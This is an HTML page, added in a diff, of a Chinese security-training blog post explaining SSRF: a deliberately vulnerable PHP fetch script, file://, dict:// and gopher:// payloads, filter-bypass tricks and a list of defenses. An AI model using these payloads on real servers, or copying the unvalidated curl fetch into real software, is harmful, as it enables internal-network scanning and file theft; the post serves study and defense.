@@ -1,0 +1,1077 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.cat.net/css?family=PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="任务标题：Web 安全之 SSRF 漏洞学习实战1、编写一个存在 ssrf 漏洞页面，思考造成该漏洞的函数有哪些 2、利用 ssrf 进行内网端口扫描（思考利用 ssrf 可以做什么，为什么）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第十三周：SSRF漏洞学习实战">
+<meta property="og:url" content="http://yoursite.com/2021/01/14/第十三周：SSRF漏洞学习实战/index.html">
+<meta property="og:site_name" content="Bu1&#39;Blog">
+<meta property="og:description" content="任务标题：Web 安全之 SSRF 漏洞学习实战1、编写一个存在 ssrf 漏洞页面，思考造成该漏洞的函数有哪些 2、利用 ssrf 进行内网端口扫描（思考利用 ssrf 可以做什么，为什么）">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2021/01/14/第十三周：SSRF漏洞学习实战/Users/11761/Desktop/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/AAAA%E4%BB%BB%E5%8A%A1/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-Bu1-1499/image-20210112164336938.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/14/第十三周：SSRF漏洞学习实战/Users/11761/Desktop/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/AAAA%E4%BB%BB%E5%8A%A1/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-Bu1-1499/image-20210112171819795.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/14/第十三周：SSRF漏洞学习实战/Users/11761/Desktop/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/AAAA%E4%BB%BB%E5%8A%A1/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-Bu1-1499/image-20210112171753568.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/14/第十三周：SSRF漏洞学习实战/Users/11761/Desktop/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/AAAA%E4%BB%BB%E5%8A%A1/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-Bu1-1499/image-20210112174020245.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/14/第十三周：SSRF漏洞学习实战/Users/11761/Desktop/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/AAAA%E4%BB%BB%E5%8A%A1/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-Bu1-1499/image-20210112173851062.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/14/第十三周：SSRF漏洞学习实战/Users/11761/Desktop/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/AAAA%E4%BB%BB%E5%8A%A1/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-Bu1-1499/image-20210112220216997.png">
+<meta property="og:image" content="http://yoursite.com/2021/01/14/第十三周：SSRF漏洞学习实战/Users/11761/Desktop/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/AAAA%E4%BB%BB%E5%8A%A1/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-Bu1-1499/image-20210112223950560.png">
+<meta property="og:updated_time" content="2021-01-14T08:57:09.794Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第十三周：SSRF漏洞学习实战">
+<meta name="twitter:description" content="任务标题：Web 安全之 SSRF 漏洞学习实战1、编写一个存在 ssrf 漏洞页面，思考造成该漏洞的函数有哪些 2、利用 ssrf 进行内网端口扫描（思考利用 ssrf 可以做什么，为什么）">
+<meta name="twitter:image" content="http://yoursite.com/2021/01/14/第十三周：SSRF漏洞学习实战/Users/11761/Desktop/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/AAAA%E4%BB%BB%E5%8A%A1/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-Bu1-1499/image-20210112164336938.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/01/14/第十三周：SSRF漏洞学习实战/">
+
+
+
+
+
+  <title>第十三周：SSRF漏洞学习实战 | Bu1'Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Bu1'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">如果能控制粗鄙的狂喜，就不会有深入骨髓的悲伤。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/01/14/第十三周：SSRF漏洞学习实战/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Bu1">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bu1'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">第十三周：SSRF漏洞学习实战</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-14T16:42:58+08:00">
+                2021-01-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信安之路/" itemprop="url" rel="index">
+                    <span itemprop="name">信安之路</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2021/01/14/第十三周：SSRF漏洞学习实战/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/01/14/第十三周：SSRF漏洞学习实战/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.2k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="任务标题：Web-安全之-SSRF-漏洞学习实战"><a href="#任务标题：Web-安全之-SSRF-漏洞学习实战" class="headerlink" title="任务标题：Web 安全之 SSRF 漏洞学习实战"></a>任务标题：Web 安全之 SSRF 漏洞学习实战</h1><p>1、编写一个存在 ssrf 漏洞页面，思考造成该漏洞的函数有哪些</p>
+<p>2、利用 ssrf 进行内网端口扫描（思考利用 ssrf 可以做什么，为什么）</p>
+<a id="more"></a>
+
+<p>扩展学习：防御 SSRF 漏洞都有哪些方式，是否可以绕过，思考总结和实际操作过程记录在报告中</p>
+<h1 id="学习报告"><a href="#学习报告" class="headerlink" title="学习报告"></a>学习报告</h1><h2 id="0x01-SSRF漏洞原理"><a href="#0x01-SSRF漏洞原理" class="headerlink" title="0x01 SSRF漏洞原理"></a>0x01 SSRF漏洞原理</h2><p>SSRF，英文全称为Server-Side Request Forgery，中文直译服务端请求伪造。从字面意思来理解，伪造服务端请求，那么很容易就可以想到用这个漏洞可以突破客户端获取不到敏感数据的限制。（服务端请求，突破了内外网限制）</p>
+<p>现在很多WEB应用都可以使用指定的URL从其他的服务器获取资源，如：获取图片、下载文件。假如这个<strong>URL完全可控</strong>，服务端为对它做任何的限制，那么我们便可以构造恶意请求地址，如读取服务器的文件<code>www.demo.com/ssrf.php?url=file:///C:/windows/win.ini</code>这样就可以被称为一次SSRF攻击。</p>
+<p>亦或是另一种情况，有些敏感资源客户端读取不到，限制了服务器读取，所以可以伪造服务器请求完成一次SSRF攻击，示意图如下：</p>
+<p><img src="/2021/01/14/第十三周：SSRF漏洞学习实战/Users/11761/Desktop/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/AAAA%E4%BB%BB%E5%8A%A1/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-Bu1-1499/image-20210112164336938.png" alt="image-20210112164336938"></p>
+<h2 id="0x02-SSRF漏洞代码示例"><a href="#0x02-SSRF漏洞代码示例" class="headerlink" title="0x02 SSRF漏洞代码示例"></a>0x02 SSRF漏洞代码示例</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">	$ch = curl_init();<span class="comment">//初始化curl会话</span></span><br><span class="line">	curl_setopt($ch,CURLOPT_URL,$url);<span class="comment">//指定请求的url</span></span><br><span class="line">	curl_setopt($ch,CURLOPT_HEADER,<span class="number">0</span>);<span class="comment">// 启用时会将头文件的信息作为数据流输出。参数为1表示输出信息头,为0表示不输出</span></span><br><span class="line">	curl_exec($ch);</span><br><span class="line">	curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>常见的可能引起SSRF的PHP函数有：<code>file_get_contents()</code>，<code>fsockopen()</code>和<code>curl_exec()</code></p>
+<blockquote>
+<p><em>file_get_contents()</em> 函数把整个文件读入一个字符串中。 </p>
+<p><em>fsockopen()</em>函数的作用是可以用来打开一个socket连接。</p>
+<p>curl_exec()功能是执行一个cURL会话,成功返回true，失败返回false。</p>
+<p><em>curl_setopt</em>()函数将为一个CURL会话设置选项。option参数是你想要的设置,value是这个选项给定的值。</p>
+</blockquote>
+<h2 id="0x03-SSRF漏洞利用"><a href="#0x03-SSRF漏洞利用" class="headerlink" title="0x03 SSRF漏洞利用"></a>0x03 SSRF漏洞利用</h2><p>利用上面编好的SSRF漏洞来测试一下：</p>
+<ul>
+<li><p>探测一下本地是否存在mysql服务器</p>
+<p><img src="/2021/01/14/第十三周：SSRF漏洞学习实战/Users/11761/Desktop/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/AAAA%E4%BB%BB%E5%8A%A1/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-Bu1-1499/image-20210112171819795.png" alt="image-20210112171819795"></p>
+<p>出现mysql相关的提示，说明这个服务器上存在mysql。</p>
+<blockquote>
+<p>Tips：如果对url后缀有限制则可以用<code>?</code>或者<code>#</code>绕过，如<code>http://127.0.0.1/SSRF/ssrf.php?url=127.0.0.1:3306/?.jpg</code></p>
+</blockquote>
+</li>
+<li><p>伪造请求访问百度(用服务器做跳板访问别的网站)</p>
+<p><img src="/2021/01/14/第十三周：SSRF漏洞学习实战/Users/11761/Desktop/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/AAAA%E4%BB%BB%E5%8A%A1/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-Bu1-1499/image-20210112171753568.png" alt="image-20210112171753568"></p>
+</li>
+<li><p>伪造请求探测服务器开放的端口</p>
+<p>和第一点相同，更改不同的端口号进行遍历来判断端口是否开放。</p>
+<p><img src="/2021/01/14/第十三周：SSRF漏洞学习实战/Users/11761/Desktop/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/AAAA%E4%BB%BB%E5%8A%A1/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-Bu1-1499/image-20210112174020245.png" alt="image-20210112174020245"></p>
+</li>
+<li><p>伪造请求读取服务器(内网)敏感资料</p>
+<p><img src="/2021/01/14/第十三周：SSRF漏洞学习实战/Users/11761/Desktop/%E4%BF%A1%E5%AE%89%E4%B9%8B%E8%B7%AF/AAAA%E4%BB%BB%E5%8A%A1/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8-SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%91%A8%EF%BC%9ASSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E6%88%98-Bu1-1499/image-20210112173851062.png" alt="image-20210112173851062"></p>
+</li>
+</ul>
+<p>其余的利用点：</p>
+<ul>
+<li>建立持续性连接传输大文件从而实现DDOS</li>
+<li>攻击运行在内网或者本地的应用程序（比如溢出）</li>
+<li>对内网的web应用进行指纹识别(访问特定页面)</li>
+<li>攻击内外网的web应用，如：struts2、sqli</li>
+</ul>
+<p>SSRF的利用主要与协议相关，其他常用的协议有：</p>
+<ol>
+<li><p>file：读取服务器上任意文件内容<code>ssrf.php?url=file:///etc/password</code></p>
+</li>
+<li><p>dict：dict://@:/d:可以用来操作内网Redis等服务<code>ssrf.php?url=dict://attacker:11111/</code>。字典协议自带头尾，限制较大，不能转化成GET或者POST的请求包。</p>
+</li>
+<li><p>ftp、ftps：FTP匿名访问、爆破</p>
+</li>
+<li><p>tftp：UDP协议扩展</p>
+</li>
+<li><p>imap/imaps/pop3/pop3s/smtp/smtps：爆破邮件用户名密码</p>
+</li>
+<li><p>phar://协议来触发反序列化漏洞</p>
+</li>
+<li><p>telnet：SSH/Telnet匿名访问及爆破</p>
+</li>
+<li><p>smb/smbs：SMB匿名访问及爆破</p>
+</li>
+<li><p>LDAP：ldap:// or ldaps:// or ldapi://代表轻量级目录访问协议</p>
+</li>
+<li><p>Gopher：gopher://  非常强大的协议，支持换行可以伪造其他的所有协议，可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求，还可以攻击内网未授权MySQL。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. http://www.aaaaa.com/ssrf.php?url=gopher://192.168.1.100:22</span><br><span class="line">2. http://www.aaaaa.com/ssrf.php?url=gopher://127.0.0.1:81/_POST%20%2fjson.php%20HTTP%2f1.1%250d%250aHost%3a%20luoke.cn%3a81%250d%250aOrigin%3az.cn%250d%250aContent-Length%3a%208%250d%250a%250d%250a&#123;%22id%22%3a1&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<h2 id="0x04-SSRF漏洞常见挖掘方法"><a href="#0x04-SSRF漏洞常见挖掘方法" class="headerlink" title="0x04 SSRF漏洞常见挖掘方法"></a>0x04 SSRF漏洞常见挖掘方法</h2><h3 id="SSRF常见的种类"><a href="#SSRF常见的种类" class="headerlink" title="SSRF常见的种类"></a>SSRF常见的种类</h3><ol>
+<li>远程下载SSRF：可以直接操纵服务器远程下载其他服务器的资源，这种可以完全回显所有信息，危害最大。</li>
+<li>布尔型SSRF：不会回显被攻击的内网信息，是提示true和false，这种对攻击者提供的信息较少，一般只能探测和盲打，利用率不高。</li>
+<li>无回显SSRF：不回显任何信息的SSRF。只能通过dnslog判断ssrf是否存在，无法用来探测内网，只能配合其他信息泄露来盲打内网。单独存在没有危害。</li>
+</ol>
+<h3 id="SSRF通常可能存在的地方"><a href="#SSRF通常可能存在的地方" class="headerlink" title="SSRF通常可能存在的地方"></a>SSRF通常可能存在的地方</h3><ol>
+<li><p>社交分享功能：获取超链接的标题等内容进行显示</p>
+</li>
+<li><p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
+</li>
+<li><p>在线翻译：给网址翻译对应网页的内容</p>
+</li>
+<li><p>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
+</li>
+<li><p>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
+</li>
+<li><p>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
+</li>
+<li><p>网站采集、网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
+</li>
+<li><p>数据库内置功能：数据库的比如mongodb的copyDatabase函数</p>
+</li>
+<li><p>邮件系统：比如接收邮件服务器地址</p>
+</li>
+<li><p>编码处理、属性信息处理、文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
+</li>
+<li><p>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p>
+</li>
+</ol>
+<h3 id="SSRF漏洞验证方法"><a href="#SSRF漏洞验证方法" class="headerlink" title="SSRF漏洞验证方法"></a>SSRF漏洞验证方法</h3><ol>
+<li><p>排除法：查看源代码看是否在本地进行了请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.XXXXX.com/***/service?image=http://www.baidu.com/img/bd_logo1.png</span><br><span class="line"></span><br><span class="line">直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>dnslog等工具进行测试，看是否被访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以在盲打后台用例中将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求.</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h3 id="SSRF绕过过滤"><a href="#SSRF绕过过滤" class="headerlink" title="SSRF绕过过滤"></a>SSRF绕过过滤</h3><ol>
+<li><p>更改ip写法，通过进制绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">例如192.168.0.1</span><br><span class="line">8进制：0300.0250.0.1</span><br><span class="line">16进制：0xC0.0xA8.0.1</span><br><span class="line">10进制整数倍：3232235521</span><br><span class="line">16进制整数格式：0xC0A80001</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用URL解析特点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。</span><br><span class="line">eg:http://www.baidu.com@192.168.0.1/</span><br><span class="line">当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>利用<code>http://xip.io</code>进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用37signals开发实现的定制DNS服务(xip.io)可以指向任意ip的域名，例如192.168.0.1.xip.io，会自动重定向到192.168.0.1上。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>短网址绕过：百度短网址，新浪短网址等</p>
+</li>
+</ol>
+<h2 id="0x05-SSRF漏洞常用防御方法"><a href="#0x05-SSRF漏洞常用防御方法" class="headerlink" title="0x05 SSRF漏洞常用防御方法"></a>0x05 SSRF漏洞常用防御方法</h2><p>通过上面的知道了SSRF漏洞最大的成因是URL完全可控，服务器会对用户构造的URL进行响应，所以从防御方面来看我们要禁止服务器随意响应用户构造的URL。</p>
+<ol>
+<li>过滤。获取到资源前先在服务器端检验是否包含敏感内容，通过后再传给用户。</li>
+<li>禁止跳转。防止用户利用服务器做跳板机</li>
+<li>禁用不需要的协议。如只开放HTTPS，这样就无法利用FILE读文件以及其他协议。</li>
+<li>限制端口。只开发常用端口</li>
+<li>统一返回的错误信息。这样用户就不可以根据返回信息判断端口情况。</li>
+<li>使用DNS缓存技术防止DNS解析攻击</li>
+<li>使用正则防止畸形绕过</li>
+</ol>
